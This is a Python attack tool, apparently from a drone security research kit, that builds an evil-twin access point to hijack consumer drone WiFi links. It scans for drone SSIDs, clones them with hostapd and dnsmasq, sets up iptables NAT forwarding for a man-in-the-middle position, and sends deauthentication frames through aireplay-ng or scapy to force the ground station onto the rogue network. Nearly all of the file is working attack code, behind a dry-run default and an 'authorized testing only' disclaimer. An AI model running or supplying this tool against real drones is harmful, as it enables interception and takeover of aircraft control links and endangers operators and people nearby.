#!/usr/bin/env python3
"""
Evil Twin AP — Rogue Access Point for Drone WiFi Hijacking

Creates a rogue access point mimicking a drone's WiFi network (e.g. TELLO-XXXXXX,
Bebop2-XXXXXX) to intercept traffic between the drone and its legitimate controller.
Supports DHCP, DNS spoofing, and traffic forwarding.

Attack flow:
  1. SCAN:    Discover drone WiFi APs in range
  2. CLONE:   Create an evil twin AP with matching SSID/channel
  3. DEAUTH:  Optionally deauth the legitimate GCS to force reconnection
  4. CAPTURE: Run DHCP server and route traffic through this host
  5. FORWARD: Forward traffic to/from the real drone (MitM position)

Works with any WiFi adapter that supports AP mode (hostapd). Monitor mode
adapter needed only for the optional deauth step.

Usage:
    # Scan for drone APs
    python3 evil-twin-ap.py scan --interface wlan0

    # Create evil twin of a specific SSID (dry run)
    python3 evil-twin-ap.py clone --ssid TELLO-AABBCC --interface wlan0

    # Create evil twin with deauth (requires monitor-mode interface)
    python3 evil-twin-ap.py clone --ssid TELLO-AABBCC --interface wlan0 \
        --deauth-interface wlan1mon --arm

    # Auto-detect and clone first drone AP found
    python3 evil-twin-ap.py auto --interface wlan0 --arm

    # SITL mode — simulate the whole flow without hardware
    python3 evil-twin-ap.py clone --ssid TELLO-AABBCC --interface wlan0 --simulate

Dependencies:
    hostapd, dnsmasq, iptables (for live mode)
    Optional: aircrack-ng (for deauth), iw (for scanning)

For CTF research and authorized security testing only.
"""

import argparse
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "exploit_chains"))
from common import AbortHandler, ChainLogger

DRONE_SSID_PATTERNS = [
    (r"^TELLO-[A-Z0-9]+$", "tello", "Ryze Tello"),
    (r"^RMTT-[A-Z0-9]+$", "tello", "Robomaster TT"),
    (r"^Bebop2?-[0-9]+$", "parrot", "Parrot Bebop"),
    (r"^ardrone2?_[0-9]+$", "parrot_ar", "Parrot AR.Drone"),
    (r"^Anafi-[A-Z0-9]+$", "parrot_anafi", "Parrot Anafi"),
    (r"^3DR-[A-Z0-9]+$", "3dr", "3DR Solo"),
    (r"^ArduPilot", "ardupilot", "ArduPilot WiFi telemetry"),
    (r"^MAVLink", "mavlink_wifi", "MAVLink WiFi bridge"),
    (r"^ESP.*[Dd]rone", "esp32", "ESP32 drone controller"),
]

DEFAULT_AP_IP = "192.168.12.1"
DEFAULT_DHCP_RANGE = ("192.168.12.10", "192.168.12.50")
DEFAULT_SUBNET = "255.255.255.0"


@dataclass
class DroneAP:
    ssid: str
    bssid: str
    channel: int
    signal: int
    encryption: str
    drone_type: str
    description: str

    def to_dict(self):
        return {
            "ssid": self.ssid,
            "bssid": self.bssid,
            "channel": self.channel,
            "signal": self.signal,
            "encryption": self.encryption,
            "drone_type": self.drone_type,
            "description": self.description,
        }


@dataclass
class EvilTwinState:
    ssid: str = ""
    channel: int = 6
    bssid: str = ""
    interface: str = "wlan0"
    ap_ip: str = DEFAULT_AP_IP
    hostapd_conf: str = ""
    dnsmasq_conf: str = ""
    hostapd_proc: subprocess.Popen | None = None
    dnsmasq_proc: subprocess.Popen | None = None
    temp_dir: str = ""
    connected_clients: list = field(default_factory=list)
    running: bool = False


def scan_drone_aps(interface: str, timeout: float,
                   logger: ChainLogger) -> list[DroneAP]:
    """Scan for drone WiFi APs using iw or iwlist."""
    logger.step("SCAN", f"Scanning for drone APs on {interface} ({timeout:.0f}s)...")
    aps = []

    try:
        result = subprocess.run(
            ["iw", "dev", interface, "scan", "--flush"],
            capture_output=True, text=True, timeout=timeout + 10,
        )
        if result.returncode != 0:
            result = subprocess.run(
                ["iwlist", interface, "scan"],
                capture_output=True, text=True, timeout=timeout + 10,
            )
    except FileNotFoundError:
        logger.error("SCAN", "Neither 'iw' nor 'iwlist' found — cannot scan")
        return aps
    except subprocess.TimeoutExpired:
        logger.warn("SCAN", "Scan timed out")
        return aps

    output = result.stdout
    current_bssid = ""
    current_ssid = ""
    current_channel = 0
    current_signal = -100
    current_enc = "Open"

    for line in output.splitlines():
        line = line.strip()

        bssid_match = re.search(r"BSS\s+([0-9a-fA-F:]{17})", line)
        if bssid_match:
            if current_ssid:
                _check_and_add(aps, current_ssid, current_bssid,
                               current_channel, current_signal, current_enc)
            current_bssid = bssid_match.group(1).upper()
            current_ssid = ""
            current_channel = 0
            current_signal = -100
            current_enc = "Open"

        ssid_match = re.search(r"SSID:\s*(.+)", line)
        if ssid_match:
            current_ssid = ssid_match.group(1).strip()

        chan_match = re.search(r"(?:channel|Channel)[:\s]+(\d+)", line)
        if chan_match:
            current_channel = int(chan_match.group(1))

        sig_match = re.search(r"signal:\s*([-\d.]+)", line)
        if sig_match:
            current_signal = int(float(sig_match.group(1)))

        if "WPA" in line or "WPA2" in line or "RSN" in line:
            current_enc = "WPA2" if "WPA2" in line or "RSN" in line else "WPA"
        elif "WEP" in line:
            current_enc = "WEP"

    if current_ssid:
        _check_and_add(aps, current_ssid, current_bssid,
                       current_channel, current_signal, current_enc)

    logger.success("SCAN", f"Found {len(aps)} drone AP(s)")
    for ap in aps:
        logger.step("SCAN", f"  {ap.ssid} ({ap.bssid}) ch={ap.channel} "
                    f"sig={ap.signal}dBm enc={ap.encryption} [{ap.description}]")
    return aps


def _check_and_add(aps, ssid, bssid, channel, signal, enc):
    for pattern, dtype, desc in DRONE_SSID_PATTERNS:
        if re.match(pattern, ssid):
            aps.append(DroneAP(ssid, bssid, channel, signal, enc, dtype, desc))
            return


def generate_hostapd_conf(state: EvilTwinState) -> str:
    """Generate hostapd configuration for the evil twin AP."""
    conf = textwrap.dedent(f"""\
        interface={state.interface}
        driver=nl80211
        ssid={state.ssid}
        hw_mode=g
        channel={state.channel}
        wmm_enabled=0
        macaddr_acl=0
        auth_algs=1
        ignore_broadcast_ssid=0
        wpa=0
    """)
    return conf


def generate_dnsmasq_conf(state: EvilTwinState) -> str:
    """Generate dnsmasq DHCP/DNS configuration."""
    range_start, range_end = DEFAULT_DHCP_RANGE
    conf = textwrap.dedent(f"""\
        interface={state.interface}
        dhcp-range={range_start},{range_end},{DEFAULT_SUBNET},24h
        dhcp-option=3,{state.ap_ip}
        dhcp-option=6,{state.ap_ip}
        server=8.8.8.8
        log-queries
        log-dhcp
        listen-address={state.ap_ip}
        bind-interfaces
    """)
    return conf


def setup_interface(interface: str, ip: str, logger: ChainLogger,
                    dry_run: bool) -> bool:
    """Configure the interface for AP mode."""
    commands = [
        ["ip", "link", "set", interface, "down"],
        ["ip", "addr", "flush", "dev", interface],
        ["ip", "addr", "add", f"{ip}/24", "dev", interface],
        ["ip", "link", "set", interface, "up"],
    ]

    for cmd in commands:
        if dry_run:
            logger.dry_run("SETUP", f"Would run: {' '.join(cmd)}")
            continue
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=10)
        except subprocess.CalledProcessError as e:
            logger.error("SETUP", f"Failed: {' '.join(cmd)}: {e.stderr.decode()}")
            return False
    return True


def setup_nat(interface: str, upstream_iface: str, logger: ChainLogger,
              dry_run: bool) -> bool:
    """Set up NAT/IP forwarding for traffic capture."""
    commands = [
        ["sysctl", "-w", "net.ipv4.ip_forward=1"],
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", upstream_iface,
         "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", interface, "-o", upstream_iface,
         "-j", "ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", upstream_iface, "-o", interface,
         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]

    for cmd in commands:
        if dry_run:
            logger.dry_run("NAT", f"Would run: {' '.join(cmd)}")
            continue
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=10)
        except subprocess.CalledProcessError as e:
            logger.error("NAT", f"Failed: {' '.join(cmd)}: {e.stderr.decode()}")
            return False
    return True


def start_evil_twin(state: EvilTwinState, logger: ChainLogger,
                    dry_run: bool) -> bool:
    """Start the evil twin AP with hostapd and dnsmasq."""
    state.temp_dir = tempfile.mkdtemp(prefix="evil-twin-")

    hostapd_path = os.path.join(state.temp_dir, "hostapd.conf")
    dnsmasq_path = os.path.join(state.temp_dir, "dnsmasq.conf")

    state.hostapd_conf = generate_hostapd_conf(state)
    state.dnsmasq_conf = generate_dnsmasq_conf(state)

    if dry_run:
        logger.dry_run("AP", f"Would write hostapd.conf:\n{state.hostapd_conf}")
        logger.dry_run("AP", f"Would write dnsmasq.conf:\n{state.dnsmasq_conf}")
        logger.dry_run("AP", f"Would start hostapd on {state.interface}")
        logger.dry_run("AP", "Would start dnsmasq DHCP server")
        return True

    with open(hostapd_path, "w") as f:
        f.write(state.hostapd_conf)
    with open(dnsmasq_path, "w") as f:
        f.write(state.dnsmasq_conf)

    if not setup_interface(state.interface, state.ap_ip, logger, dry_run):
        return False

    logger.step("AP", "Starting hostapd...")
    try:
        state.hostapd_proc = subprocess.Popen(
            ["hostapd", hostapd_path],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        time.sleep(2)
        if state.hostapd_proc.poll() is not None:
            out = state.hostapd_proc.stdout.read().decode()
            logger.error("AP", f"hostapd exited: {out}")
            return False
    except FileNotFoundError:
        logger.error("AP", "hostapd not found — install with: apt install hostapd")
        return False

    logger.step("AP", "Starting dnsmasq DHCP/DNS...")
    try:
        state.dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_path, "-d"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        time.sleep(1)
        if state.dnsmasq_proc.poll() is not None:
            out = state.dnsmasq_proc.stdout.read().decode()
            logger.error("AP", f"dnsmasq exited: {out}")
            return False
    except FileNotFoundError:
        logger.error("AP", "dnsmasq not found — install with: apt install dnsmasq")
        return False

    state.running = True
    logger.success("AP", f"Evil twin '{state.ssid}' running on {state.interface} "
                   f"(ch={state.channel}, IP={state.ap_ip})")
    return True


def deauth_clients(bssid: str, interface: str, count: int,
                   logger: ChainLogger, dry_run: bool):
    """Send deauth frames to disconnect clients from the real AP."""
    if dry_run:
        logger.dry_run("DEAUTH", f"Would send {count} deauth frames to {bssid} "
                       f"via {interface}")
        return

    logger.step("DEAUTH", f"Sending {count} deauth frames to {bssid}...")
    try:
        subprocess.run(
            ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface],
            capture_output=True, timeout=30,
        )
        logger.success("DEAUTH", f"Sent {count} deauth frames")
    except FileNotFoundError:
        logger.warn("DEAUTH", "aireplay-ng not found — trying scapy fallback")
        _deauth_scapy(bssid, interface, count, logger)
    except subprocess.TimeoutExpired:
        logger.warn("DEAUTH", "Deauth timed out")


def _deauth_scapy(bssid: str, interface: str, count: int, logger: ChainLogger):
    """Fallback deauth using scapy."""
    try:
        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
        pkt = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid
        ) / Dot11Deauth(reason=7)
        sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)
        logger.success("DEAUTH", f"Sent {count} deauth frames via scapy")
    except ImportError:
        logger.error("DEAUTH", "Neither aireplay-ng nor scapy available for deauth")


def stop_evil_twin(state: EvilTwinState, logger: ChainLogger):
    """Stop all evil twin processes and clean up."""
    if state.hostapd_proc and state.hostapd_proc.poll() is None:
        state.hostapd_proc.terminate()
        state.hostapd_proc.wait(timeout=5)
        logger.step("CLEANUP", "Stopped hostapd")

    if state.dnsmasq_proc and state.dnsmasq_proc.poll() is None:
        state.dnsmasq_proc.terminate()
        state.dnsmasq_proc.wait(timeout=5)
        logger.step("CLEANUP", "Stopped dnsmasq")

    if state.temp_dir and os.path.exists(state.temp_dir):
        shutil.rmtree(state.temp_dir, ignore_errors=True)
        logger.step("CLEANUP", "Removed temp config files")

    state.running = False
    logger.success("CLEANUP", "Evil twin stopped")


def simulate_evil_twin(ssid: str, channel: int, logger: ChainLogger):
    """SITL simulation of evil twin — no hardware needed."""
    logger.step("SIMULATE", f"Simulating evil twin AP: {ssid}")
    logger.step("SIMULATE", f"  SSID: {ssid}")
    logger.step("SIMULATE", f"  Channel: {channel}")
    logger.step("SIMULATE", f"  IP: {DEFAULT_AP_IP}")
    logger.step("SIMULATE", f"  DHCP range: {DEFAULT_DHCP_RANGE[0]}-{DEFAULT_DHCP_RANGE[1]}")

    logger.success("SIMULATE", "Evil twin 'started' (simulated)")
    logger.step("SIMULATE", "Simulating client connection...")
    time.sleep(1)

    sim_client = {
        "mac": "AA:BB:CC:DD:EE:01",
        "ip": "192.168.12.10",
        "hostname": "GCS-Laptop",
        "connected_at": datetime.now(timezone.utc).isoformat(),
    }
    logger.success("SIMULATE", f"Client connected: {sim_client['mac']} → {sim_client['ip']}")

    logger.step("SIMULATE", "MitM position established — traffic flowing through us")
    logger.step("SIMULATE", "  GCS (192.168.12.10) ←→ Evil Twin (192.168.12.1) ←→ Drone")

    return {
        "status": "simulated",
        "ssid": ssid,
        "channel": channel,
        "ap_ip": DEFAULT_AP_IP,
        "clients": [sim_client],
        "mitm_ready": True,
    }


def cmd_scan(args, logger, abort):
    """Scan subcommand."""
    if args.simulate:
        logger.step("SIMULATE", "Simulated scan results:")
        sim_aps = [
            DroneAP("TELLO-AABBCC", "60:60:1F:AA:BB:CC", 6, -45, "Open", "tello", "Ryze Tello"),
            DroneAP("ardrone2_044833", "A0:14:3D:11:22:33", 11, -62, "Open", "parrot_ar", "Parrot AR.Drone"),
            DroneAP("MAVLink-Bridge", "B4:E6:2D:55:66:77", 1, -58, "Open", "mavlink_wifi", "MAVLink WiFi bridge"),
        ]
        for ap in sim_aps:
            logger.step("SCAN", f"  {ap.ssid} ({ap.bssid}) ch={ap.channel} "
                        f"sig={ap.signal}dBm [{ap.description}]")
        if args.output:
            with open(args.output, "w") as f:
                json.dump([a.to_dict() for a in sim_aps], f, indent=2)
            logger.step("SCAN", f"Results saved to {args.output}")
        return

    aps = scan_drone_aps(args.interface, args.timeout, logger)
    if args.output:
        with open(args.output, "w") as f:
            json.dump([a.to_dict() for a in aps], f, indent=2)
        logger.step("SCAN", f"Results saved to {args.output}")


def cmd_clone(args, logger, abort):
    """Clone subcommand — create evil twin AP."""
    dry_run = not args.arm

    if args.simulate:
        result = simulate_evil_twin(args.ssid, args.channel, logger)
        if args.output:
            with open(args.output, "w") as f:
                json.dump(result, f, indent=2)
        return

    state = EvilTwinState(
        ssid=args.ssid,
        channel=args.channel,
        interface=args.interface,
        ap_ip=args.ap_ip or DEFAULT_AP_IP,
    )

    if args.bssid:
        state.bssid = args.bssid

    if not start_evil_twin(state, logger, dry_run):
        logger.error("CLONE", "Failed to start evil twin")
        return

    if args.upstream and not dry_run:
        setup_nat(state.interface, args.upstream, logger, dry_run)

    if args.deauth_interface and state.bssid:
        deauth_clients(state.bssid, args.deauth_interface,
                       args.deauth_count, logger, dry_run)

    if dry_run:
        logger.step("CLONE", "Dry run complete — no AP was actually created")
        return

    logger.step("CLONE", "Evil twin running. Press Ctrl+C to stop.")

    def _signal_handler(sig, frame):
        stop_evil_twin(state, logger)
        sys.exit(0)

    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    try:
        while state.running:
            time.sleep(1)
    finally:
        stop_evil_twin(state, logger)


def cmd_auto(args, logger, abort):
    """Auto subcommand — scan and clone the first drone AP found."""
    if args.simulate:
        logger.step("AUTO", "Simulated auto-detect mode")
        simulate_evil_twin("TELLO-AABBCC", 6, logger)
        return

    aps = scan_drone_aps(args.interface, args.timeout, logger)
    if not aps:
        logger.error("AUTO", "No drone APs found — nothing to clone")
        return

    target = aps[0]
    logger.step("AUTO", f"Auto-selected target: {target.ssid} ({target.bssid})")

    args.ssid = target.ssid
    args.channel = target.channel
    args.bssid = target.bssid
    cmd_clone(args, logger, abort)


def main():
    parser = argparse.ArgumentParser(
        description="Evil Twin AP — Rogue access point for drone WiFi hijacking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )
    subparsers = parser.add_subparsers(dest="command", help="Subcommand")

    # Scan
    scan_p = subparsers.add_parser("scan", help="Scan for drone WiFi APs")
    scan_p.add_argument("--interface", "-i", default="wlan0")
    scan_p.add_argument("--timeout", type=float, default=15.0)
    scan_p.add_argument("--output", "-o", help="Save results to JSON file")
    scan_p.add_argument("--simulate", action="store_true",
                        help="Simulated scan (no hardware needed)")

    # Clone
    clone_p = subparsers.add_parser("clone", help="Create evil twin AP")
    clone_p.add_argument("--ssid", required=True, help="SSID to clone")
    clone_p.add_argument("--channel", type=int, default=6, help="WiFi channel")
    clone_p.add_argument("--bssid", help="BSSID of the real AP (for deauth targeting)")
    clone_p.add_argument("--interface", "-i", default="wlan0",
                         help="WiFi interface for AP mode")
    clone_p.add_argument("--ap-ip", default=DEFAULT_AP_IP,
                         help=f"IP address for the evil twin (default: {DEFAULT_AP_IP})")
    clone_p.add_argument("--upstream", help="Upstream interface for NAT (e.g. eth0)")
    clone_p.add_argument("--deauth-interface",
                         help="Monitor mode interface for deauth (e.g. wlan1mon)")
    clone_p.add_argument("--deauth-count", type=int, default=10,
                         help="Number of deauth frames to send (default: 10)")
    clone_p.add_argument("--arm", action="store_true",
                         help="Actually create the AP (default: dry run)")
    clone_p.add_argument("--output", "-o", help="Save state to JSON file")
    clone_p.add_argument("--simulate", action="store_true",
                         help="Simulate without hardware")

    # Auto
    auto_p = subparsers.add_parser("auto",
                                   help="Auto-detect and clone first drone AP")
    auto_p.add_argument("--interface", "-i", default="wlan0")
    auto_p.add_argument("--timeout", type=float, default=15.0)
    auto_p.add_argument("--arm", action="store_true")
    auto_p.add_argument("--upstream", help="Upstream interface for NAT")
    auto_p.add_argument("--deauth-interface", help="Monitor interface for deauth")
    auto_p.add_argument("--deauth-count", type=int, default=10)
    auto_p.add_argument("--ap-ip", default=DEFAULT_AP_IP)
    auto_p.add_argument("--output", "-o")
    auto_p.add_argument("--simulate", action="store_true")

    # Common
    parser.add_argument("--log-dir", help="Directory for JSON event log")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        return

    logger = ChainLogger("evil-twin", args.log_dir)
    abort = AbortHandler(logger)

    logger.step("INIT", f"Evil Twin AP — {args.command} mode")

    dispatch = {"scan": cmd_scan, "clone": cmd_clone, "auto": cmd_auto}
    dispatch[args.command](args, logger, abort)
    logger.save()


if __name__ == "__main__":
    main()
